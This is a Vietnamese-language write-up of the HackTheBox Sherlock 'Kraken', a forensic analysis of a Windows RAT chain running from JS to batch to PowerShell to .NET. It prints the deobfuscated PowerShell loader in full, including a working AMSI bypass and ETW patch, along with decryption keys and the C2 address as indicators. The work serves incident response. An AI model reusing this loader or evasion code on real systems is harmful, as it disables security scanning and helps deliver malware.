---
title: "Sherlock: Kraken [Medium]"
date: 2026-07-15 07:22:00 +0700
categories: [SherLock]
tags: [HackTheBox, Sherlock, DFIR, Malware Analysis, Windows, .NET, PowerShell, Obfuscation, AMSI, C2]
image: /assets/images3/banner.jpg
toc: true
layout: post
---

## Description

Our SOC detected an emerging RAT variant delivered via malicious file execution in its early stages, triggering an alert before C2 communication was fully established. Rapid containment prevented further exfiltration or post-exploitation activities. A full forensic triage was conducted to analyze persistence mechanisms and C2 infrastructure, enabling comprehensive IOC extraction to provide them to our threat intelligence platform for enhanced detection and proactive hunting.

## Solution

### Q1. What was the exact date and time the malicious file was executed by the user?

![image](/assets/images17/image-7.png)

Dựa trên mẫu được cung cấp, mình không còn thấy rõ các artifact còn sót lại trên máy nạn nhân. Tuy nhiên dựa vào `Recent` là nơi các file shortcut được tạo ra tự động trong quá trình ứng dụng được thực thi thì phát hiện được 1 file js và 1 file pdf. Điều tra tiếp thì thấy được khả năng cao file pdf không liên quan đến trường hợp này. Nên tập trung vào file js

Dùng LEcmd để để phân tích file js.lnk

![image](/assets/images17/image-8.png)

Thấy được thời gian tạo file này là `2025-06-13 14:43:27`, ngoài ra còn nằm tại thư mục Downloads => rất sus. Hơn nữa, ta biết được nếu chạy 1 file js thì windows sẽ kích hoạt môi trường thực thi bằng cách gọi `wscript.exe`. Check tiếp prefetch của `wscript.exe`, ta xác nhận thêm được sau khi js được thực thi thì nó sẽ spawn ra 1 file `.bat` trong Temp

![image](/assets/images17/image-9.png)

Điều này khẳng định thêm được mốc thời gian trên là phù hợp với câu hỏi của bài

`Answer: 2025-06-13 14:43:27`

### Q2. During the initial stage of execution, what is the name of the first file dropped by the malicious file?

Ngay câu hỏi trên ta xác định ra file dropped

![image](/assets/images17/image.png)

`Answer: temp_993805.bat`

### Q3. During the initial stage of execution, The malicious file performed in-memory patching of a critical security function by overwriting it with a 6-byte sequence that forces the function to return zero. What is this hexadecimal byte sequence?

Tiến hành phân tích source code .bat kia thấy được bị ofuscate khá nặng. Mục đích sau khi chạy file .bat sẽ parse ra một code pwsh. Từ đây có 2 hướng đi một là vào dựa vào `Powershell log` để lấy được đoạn code đó, 2 là deofuscate file .bat kia thủ công

- Cách 1: Dựa vào log

![image](/assets/images17/image-1.png)

- Cách 2: Deof file bat thủ công

![image](/assets/images17/image-2.png)

Khi thực thi, batch script xác định đường dẫn của chính nó thông qua:

```
%~dp0%~nx0
```
Sau đó tự sao chép chính nó vào thư mục profile của người dùng với tên:

```
C:\Users\<username>\dwm.bat
```

Tiếp thep nó thực hiện set rất nhiều biến, mỗi biến là một mảnh trong một chuỗi pwsh lớn, sau đó thực hiện ghép chúng lại theo đúng thứ tự sau

![image](/assets/images17/image-3.png)

Giờ dùng script python để thực hiện nối đúng thứ tự 

```python
from pathlib import Path
import re


CHUNKS_FILE = Path("file2.txt")
ORDER_FILE = Path("file1.txt")
OUTPUT_FILE = Path("payload.txt")


def parse_chunks(content: str) -> dict[str, str]:
    chunks = {}

    for line_number, line in enumerate(
        content.splitlines(),
        start=1,
    ):
        line = line.strip()

        first_quote = line.find('"')
        last_quote = line.rfind('"')

        if first_quote == -1 or last_quote == -1:
            continue

        if first_quote == last_quote:
            continue

        assignment = line[first_quote + 1:last_quote]

        if "=" not in assignment:
            continue

        name, value = assignment.split("=", 1)

        name = name.strip()

        if not name:
            continue

        chunks[name] = value

        print(
            f"[PARSE] line {line_number:03}: "
            f"{name} -> {value}"
        )

    return chunks


def parse_order(content: str) -> list[str]:
    return re.findall(
        r"%([^%]+)%",
        content,
    )


def main():
    chunks_content = CHUNKS_FILE.read_text(
        encoding="utf-8",
        errors="replace",
    )

    order_content = ORDER_FILE.read_text(
        encoding="utf-8",
        errors="replace",
    )

    chunks = parse_chunks(chunks_content)
    order = parse_order(order_content)

    print()
    print(f"[+] Parsed chunks : {len(chunks)}")
    print(f"[+] Order entries : {len(order)}")
    print()

    result = []
    missing = []

    for index, name in enumerate(order, start=1):

        if name not in chunks:
            print(f"[-] Missing #{index}: {name}")
            missing.append(name)
            continue

        value = chunks[name]

        print(
            f"[+] #{index:03} "
            f"{name:<10} -> {value}"
        )

        result.append(value)

    final_payload = "".join(result)

    OUTPUT_FILE.write_text(
        final_payload,
        encoding="utf-8",
    )

    print()
    print("=" * 60)
    print(f"[+] Parsed chunks : {len(chunks)}")
    print(f"[+] Order entries : {len(order)}")
    print(f"[+] Missing       : {len(missing)}")
    print(f"[+] Final length  : {len(final_payload)}")
    print(f"[+] Output        : {OUTPUT_FILE}")
    print("=" * 60)
    print(final_payload)


if __name__ == "__main__":
    main()
```
![image](/assets/images17/image-4.png)

Script trên thực hiện giải mã một chuỗi Base64 sau đó thực thi bằng `Invoke-Expression`. Chuỗi decode b64:

![image](/assets/images17/image-5.png)

```
$zmhlh = @'
$lywyupnniwjnwvw = $env:USERNAME
$xmjclwpvfnogfdf = "C:\Users\$lywyupnniwjnwvw\dwm.bat"

if (Test-Path $xmjclwpvfnogfdf) {
    Write-Host `
        "Batch file found: $xmjclwpvfnogfdf" `
        -ForegroundColor Cyan

    $fileLines = [System.IO.File]::ReadAllLines(
        $xmjclwpvfnogfdf,
        [System.Text.Encoding]::UTF8
    )

    foreach ($line in $fileLines) {
        if ($line -match '^::: ?(.+)$') {
            Write-Host `
                "Injection code detected in the batch file." `
                -ForegroundColor Cyan

            try {
                $decodedBytes = [System.Convert]::FromBase64String(
                    $matches[1].Trim()
                )

                $injectionCode = [System.Text.Encoding]::Unicode.GetString(
                    $decodedBytes
                )

                Write-Host `
                    "Injection code decoded successfully." `
                    -ForegroundColor Green

                Write-Host `
                    "Executing injection code..." `
                    -ForegroundColor Yellow

                Invoke-Expression $injectionCode
                break
            }
            catch {
                Write-Host `
                    "Error during decoding or executing injection code: $_" `
                    -ForegroundColor Red
            }
        }
    }
}
else {
    Write-Host `
        "System Error: Batch file not found: $xmjclwpvfnogfdf" `
        -ForegroundColor Red

    exit
}


function gbpqucxrcfxcqcc($param_var) {
    $aes_var = [System.Security.Cryptography.Aes]::Create()

    $aes_var.Mode = [
        System.Security.Cryptography.CipherMode
    ]::CBC

    $aes_var.Padding = [
        System.Security.Cryptography.PaddingMode
    ]::PKCS7

    $aes_var.Key = [System.Convert]::FromBase64String(
        'ImocNEnUZbHBmaXIBtoy7X3HCr9QsCDJAUlkq43qYFg='
    )

    $aes_var.IV = [System.Convert]::FromBase64String(
        'WCpQVGqc+E4SNHfKYV5jVQ=='
    )

    $decryptor_var = $aes_var.CreateDecryptor()

    $return_var = $decryptor_var.TransformFinalBlock(
        $param_var,
        0,
        $param_var.Length
    )

    $decryptor_var.Dispose()
    $aes_var.Dispose()

    $return_var
}


function moegszljbtuuqty($param_var) {
    $ktumygjgvoympdu = New-Object System.IO.MemoryStream(
        ,$param_var
    )

    $gbnacpxhbjvsoxa = New-Object System.IO.MemoryStream

    $hgxevehdevdhjst = New-Object System.IO.Compression.GZipStream(
        $ktumygjgvoympdu,
        [IO.Compression.CompressionMode]::Decompress
    )

    $hgxevehdevdhjst.CopyTo($gbnacpxhbjvsoxa)

    $hgxevehdevdhjst.Dispose()
    $ktumygjgvoympdu.Dispose()

    $result = $gbnacpxhbjvsoxa.ToArray()
    $gbnacpxhbjvsoxa.Dispose()

    $result
}


function verjrjrqdodbnti(
    $param_var,
    $param2_var
) {
    $loadMethod = 'daoL'[-1..-4] -join ''

    $nwfhmshprjnltdd = [System.Reflection.Assembly]::$loadMethod(
        [byte[]]$param_var
    )

    $nuiugsoliqzxjfz = $nwfhmshprjnltdd.EntryPoint

    $nuiugsoliqzxjfz.Invoke(
        $null,
        $param2_var
    )
}


$host.UI.RawUI.WindowTitle = $xmjclwpvfnogfdf

$readAllTextMethod = 'txeTllAdaeR'[-1..-11] -join ''

$wfdeypelsakoqbr = [System.IO.File]::$readAllTextMethod(
    $xmjclwpvfnogfdf
).Split(
    [Environment]::NewLine
)

foreach ($iztnbpjgjpisvip in $wfdeypelsakoqbr) {
    if ($iztnbpjgjpisvip.StartsWith(':: ')) {
        $wxjuawmvyltbrba = $iztnbpjgjpisvip.Substring(3)
        break
    }
}

$owlhnktitgnqaer = [string[]]$wxjuawmvyltbrba.Split('\')

$eqmijlluxoedssc = moegszljbtuuqty (
    gbpqucxrcfxcqcc (
        [Convert]::FromBase64String(
            $owlhnktitgnqaer[0]
        )
    )
)

$lktibmgovfhzxpq = moegszljbtuuqty (
    gbpqucxrcfxcqcc (
        [Convert]::FromBase64String(
            $owlhnktitgnqaer[1]
        )
    )
)

verjrjrqdodbnti `
    $eqmijlluxoedssc `
    $null

verjrjrqdodbnti `
    $lktibmgovfhzxpq `
    (,[string[]]('%*'))
'@

$hnphv = $zmhlh -replace '', ''

Invoke-Expression $hnphv
```

Logic của chương trình như sau. Đầu tiên gọi lại file `dwm.bat` để thực hiện đọc 2 chuỗi sau dấu `:::` và `::`

![image](/assets/images17/image-6.png)

Đối với chuỗi sau `:::` thì đơn giản là thực hiện decode b64 để ra được 1 đoạn mã pwsh khác

```powershell
function Invoke-SystemMaintenance {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$false, Position=0)]
        [switch]$LogDetails,
        [Parameter(Mandatory=$false, Position=0)]
        [switch]$OptimizePerformance
    )

    if ($LogDetails) { $VerbosePreference = "Continue" }

    try {
        function Get-WindowsAPIFunction {
            param ([string]$DllName, [string]$FunctionName)
            $moduleHandler = $Core_ModuleLoader.Invoke($null, @($DllName))
            $tempReference = New-Object IntPtr
            $handleReference = New-Object System.Runtime.InteropServices.HandleRef($tempReference, $moduleHandler)
            $Core_FunctionLoader.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$handleReference, $FunctionName))
        }

        function Get-SystemComponent {
            param (
                [Parameter(Position=0, Mandatory=$true)]
                [IntPtr]$ComponentAddress,
                [Parameter(Position=1, Mandatory=$true)]
                [Type[]]$ParameterTypes,
                [Parameter(Position=2)]
                [Type]$ReturnType = [Void]
            )
            $currentDomain = [AppDomain]::("Curren" + "tDomain")
            $assemblyName = New-Object System.Reflection.AssemblyName('SystemAssembly')
            $assemblyBuilder = $currentDomain.DefineDynamicAssembly($assemblyName, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
            $moduleBuilder = $assemblyBuilder.DefineDynamicModule('SystemModule', $false)
            $typeBuilder = $moduleBuilder.DefineType('SystemComponent', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
            $constructor = $typeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $ParameterTypes)
            $constructor.SetImplementationFlags('Runtime, Managed')
            $methodBuilder = $typeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $ParameterTypes)
            $methodBuilder.SetImplementationFlags('Runtime, Managed')
            $componentType = $typeBuilder.CreateType()
            [System.Runtime.InteropServices.Marshal]::("GetDelegate" + "ForFunctionPointer")($ComponentAddress, $componentType)
        }

        Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
        $SystemMemory = [System.Runtime.InteropServices.Marshal]
        $WindowsAPI = [Windows.Forms.Form].Assembly.GetType('System.Windows.Forms.UnsafeNativeMethods')
        $bytesGetFunction = [Byte[]](0x47,0x65,0x74,0x50,0x72,0x6F,0x63,0x41,0x64,0x64,0x72,0x65,0x73,0x73)
        $bytesGetModule  = [Byte[]](0x47,0x65,0x74,0x4D,0x6F,0x64,0x75,0x6C,0x65,0x48,0x61,0x6E,0x64,0x6C,0x65)
        $getFunctionName = [System.Text.Encoding]::ASCII.GetString($bytesGetFunction)
        $getModuleName  = [System.Text.Encoding]::ASCII.GetString($bytesGetModule)
        $Core_ModuleLoader = $WindowsAPI.GetMethod($getModuleName)
        $Core_FunctionLoader = $WindowsAPI.GetMethod($getFunctionName)
        $bytesInitialize = [Byte[]](0x41,0x6D,0x73,0x69,0x49,0x6E,0x69,0x74,0x69,0x61,0x6C,0x69,0x7A,0x65)
        $bytesLibrary  = [Byte[]](0x61,0x6D,0x73,0x69,0x2E,0x64,0x6C,0x6C)
        $libraryName    = [System.Text.Encoding]::ASCII.GetString($bytesLibrary)
        $initFunction  = [System.Text.Encoding]::ASCII.GetString($bytesInitialize)
        $initializeAddress = Get-WindowsAPIFunction $libraryName $initFunction
        $pointerSize = $SystemMemory::SizeOf([Type][IntPtr])
        if ($pointerSize -eq 8) {
            $initializeComponent = Get-SystemComponent $initializeAddress @([string], [UInt64].MakeByRefType()) ([Int])
            [Int64]$systemContext = 0
        }
        else {
            $initializeComponent = Get-SystemComponent $initializeAddress @([string], [IntPtr].MakeByRefType()) ([Int])
            $systemContext = 0
        }
        $securitySuffix = 'Virt' + 'ualProtec'
        $securityMethod = '{0}{1}' -f $securitySuffix, 't'
        $kernelLibrary  = "ker{0}.dll" -f "nel32"
        $securityAddress   = Get-WindowsAPIFunction $kernelLibrary $securityMethod
        $securityDelegate = Get-SystemComponent $securityAddress @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $MEMORY_PROTECTION_CONSTANT = 0x00000080
        $optimizationData = [byte[]](0xb8,0x0,0x00,0x00,0x00,0xC3)
        $originalProtection   = 0
        $componentIndex      = 0
        if ($initializeComponent.Invoke("Scanner", [ref]$systemContext) -ne 0) {
            if ($systemContext -eq 0) { Throw "[!] No system component found." }
            else { Throw "[!] Error initializing system component." }
        }
        if ($pointerSize -eq 8) {
            $mainData = $SystemMemory::ReadInt64([IntPtr]$systemContext, 16)
            $componentPointer  = $SystemMemory::ReadInt64([IntPtr]$mainData, 64)
        }
        else {
            $mainData = $SystemMemory::ReadInt32($systemContext + 8)
            $componentPointer  = $SystemMemory::ReadInt32($mainData + 36)
        }
        while ($componentPointer -ne 0) {
            if ($pointerSize -eq 8) {
                $functionTable   = $SystemMemory::ReadInt64([IntPtr]$componentPointer)
                $scannerAddress = $SystemMemory::ReadInt64([IntPtr]$functionTable, 24)
            }
            else {
                $functionTable   = $SystemMemory::ReadInt32($componentPointer)
                $scannerAddress = $SystemMemory::ReadInt32($functionTable + 12)
            }
            if (-not $securityDelegate.Invoke($scannerAddress, [uint32]6, $MEMORY_PROTECTION_CONSTANT, [ref]$originalProtection)) {
                Throw "[!] Error modifying memory settings at $scannerAddress"
            }
            try {
                $SystemMemory::Copy($optimizationData, 0, [IntPtr]$scannerAddress, 6)
            }
            catch {
                Throw "[!] Error applying optimization at $scannerAddress"
            }
            for ($i=0; $i -lt $optimizationData.Length; $i++) {
                $verificationByte = $SystemMemory::ReadByte([IntPtr]::Add($scannerAddress, $i))
                if ($verificationByte -ne $optimizationData[$i]) { Throw "[!] Optimization failed at $scannerAddress" }
            }
            if (-not $securityDelegate.Invoke($scannerAddress, [uint32]6, $originalProtection, [ref]$originalProtection)) {
                Throw "[!] Failed to restore memory settings at $scannerAddress"
            }
            $componentIndex++
            if ($pointerSize -eq 8) {
                $componentPointer = $SystemMemory::ReadInt64([IntPtr]$mainData, 64 + ($componentIndex * $pointerSize))
            }
            else {
                $componentPointer = $SystemMemory::ReadInt32($mainData + 36 + ($componentIndex * $pointerSize))
            }
        }
        if ($OptimizePerformance) {
            $bytesService = [Byte[]](0x45,0x74,0x77,0x45,0x76,0x65,0x6E,0x74,0x57,0x72,0x69,0x74,0x65)
            $serviceName  = [System.Text.Encoding]::ASCII.GetString($bytesService)
            $serviceAddress  = Get-WindowsAPIFunction ("nt{0}.dll" -f "dll") $serviceName
            if (-not $securityDelegate.Invoke($serviceAddress, 1, $MEMORY_PROTECTION_CONSTANT, [ref]$originalProtection)) {
                Throw "[!] Error modifying memory settings of $serviceName"
            }
            try {
                if ($pointerSize -eq 8) {
                    $SystemMemory::WriteByte($serviceAddress, 0xC3)
                }
                else {
                    $servicePatch = [byte[]](0xb8,0xff,0x55)
                    $SystemMemory::Copy($servicePatch, 0, [IntPtr]$serviceAddress, 3)
                }
            }
            catch {
                Throw "[!] Error optimizing $serviceName"
            }
            if (-not $securityDelegate.Invoke($serviceAddress, 1, $originalProtection, [ref]$originalProtection)) {
                Throw "[!] Failed to restore memory settings of $serviceName"
            }
            Write-Output "[*] Connected."
        }
        else {
            Write-Output "[*] System maintenance completed."
        }
    }
    catch {
        Throw $_
    }
}

Invoke-SystemMaintenance -OptimizePerformance
```

Đoạn code trên chủ yếu có nhiệm vụ chuẩn bị môi trường trước khi thực thi các payload .NET được nhúng phía sau `::`

Cụ thể, script động giải mã tên các API như `AmsiInitialize`, `VirtualProtect` và `EtwEventWrite` từ các mảng byte thay vì khai báo trực tiếp dưới dạng chuỗi văn bản. Sau đó, nó sử dụng các API này để thực hiện `AMSI bypass`và `ETW patching` trong bộ nhớ của tiến trình hiện tại.

Còn đối với câu hỏi trên thì trong giai đoạn đầu thực thi, malware thực hiện in-memory patching đối với hàm quét của AMSI. Sau khi thay đổi quyền truy cập vùng nhớ bằng VirtualProtect, malware ghi đè phần đầu của hàm bằng chuỗi 6 byte là `0xB8,0x0,0x00,0x00,0x00,0xC3`

Chuỗi lệnh này tương ứng với:

```
mov eax, 0
ret
```
Việc ghi đè này khiến hàm trả về giá trị 0 ngay lập tức mà không thực hiện quá trình quét, qua đó vô hiệu hóa cơ chế quét của AMSI trong tiến trình hiện tại trước khi payload .NET được thực thi

`Answer: 0xB8,0x0,0x00,0x00,0x00,0xC3`


### Q4: What is the name of the file responsible for dropping the second-stage PE Files? (2nd Stage)

Ngay trong file bat ban đầu

```
Answer: dwm.bat
```

### Q5. What is the SHA-1 hash of the PE file created during the infection process, not malicious on its own?

Tiếp nối phân tích từ câu 3, thì đoạn mã sau `::` được sử dụng để tạo ra 2 file PE khác nhau ngăn cách nhau bởi dấu `\`, thực hiện giải mã , giải nén rồi nạp trực tiếp assembly .NET vào bộ nhớ để thực thi

```
dwm.bat
     │
     ▼
Đọc dòng ":: ..."
     │
     ▼
Tách thành 2 payload
     │
     ▼
Base64 Decode
     │
     ▼
AES-CBC Decrypt
     │
     ▼
GZip Decompress
     │
     ▼
Assembly .NET (byte[])
     │
     ▼
Assembly.Load()
     │
     ▼
EntryPoint.Invoke()
```

Do Key và IV cũng đã được hardcore trong code nên rất dễ để lôi 2 payload ra

Payload 1:

![image](/assets/images17/image-10.png)

Payload 2:

![image](/assets/images17/image-11.png)

Phân tích tiếp thì nhận thấy trong 2 file PE này thì có payload 1 không phải là malicious

![image](/assets/images17/image-12.png)

`Answer: 339e27243df24f2b8979e78711e396698f4f47cc`

### Q6. In the third stage, what is the name of the malicious encrypted file that is injected into memory?

Dùng Ilspy để phân tích `.NET` 

Đây là một con `.NET` loader dùng để drop xuống tiếp một stage khác

Các chức năng chính của nó như sau:

#### Persistence

Ghi file .bat với filename gồm 4 kí tự ngẫu nhiên vào thư mục Startup

![image](/assets/images17/image-14.png)

#### Defender Exclusion toàn ổ C

![image](/assets/images17/image-15.png)

#### Drop file exe được lưu trong resource

![image](/assets/images17/image-16.png)

Tiếp theo thực hiện AES decrypt và giải nén Gzip, sau đó nạp trực tiếp vào bộ nhớ bằng Assembly.Load() rồi chạy

KEY và IV được hardcore ngay trong code nên ta cũng dễ dàng decrypt

![image](/assets/images17/image-13.png)

`Answer: xxxxxxxxxxxxxxxxxxxxxxxxxxxx.exe`

### Q7. What encryption key and initialization vector (IV) were used to decrypt the file prior to memory injection?

`Answer: ALWIGeOnxudniHR2K4CNZmnaEZffXt6zKsRFoAM2/mA=,JXYbOTuuz3cErOl30kAKhw==`

### Q8. What is the SHA-1 hash of that file after decryption?

![image](/assets/images17/image-17.png)

`Answer: 052c0687f023564a3c31fb652bea3405341272cb`

### Q9. There are 3 user agent strings in that PE File, what is the one related to the Mobile Device?

Final stage tiếp tục được viết bằng .NET. Trong class `Concentrate`, malware khai báo một mảng chuỗi chứa ba giá trị User-agent. Mỗi khi gửi HTTP request tới C2, malware sẽ chon ngẫu nhiên 1 trong 3 UA này để đưa vào header.

![image](/assets/images17/image-18.png)


Trong 3 chuỗi này thì chuỗi đại diện cho thiết bị di động là `Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1`


### Q10. What variable stores the mutex object created by this binary?

![image](/assets/images17/image-19.png)

`Answer: Territories`

### Q11. What is the ip address and port number that C2 file connects to during that time?

![image](/assets/images17/image-20.png)

Trong class `Louisiana` chứa config của C2 server, ở đây thì chỉ chứa domain, ta có thể dùng nslookup để resolve DNS ra IP

![image](/assets/images17/image-21.png)

`Answer: 107.172.232.84:2468`
### Q12. A persistence file was dropped to maintain access for the attacker. What is the full path of this file?

![image](/assets/images17/image-22.png)

`Answer: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\5c74.bat`
